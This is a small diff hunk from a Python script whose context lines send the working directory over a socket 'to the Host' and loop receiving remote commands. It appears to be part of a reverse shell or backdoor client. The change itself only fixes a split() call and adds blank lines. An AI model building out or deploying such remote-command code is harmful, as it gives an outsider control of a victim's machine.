@@ -28,7 +28,15 @@ s.send(cwd.encode()) #Sends the cwd to the Host
 while True:
     command = s.recv(Size).decode()
 
-    splited = command.split
+
+
+
+
+
+
+
+
+    splited = command.split()
 
     if command.lower() == "exit":
         break
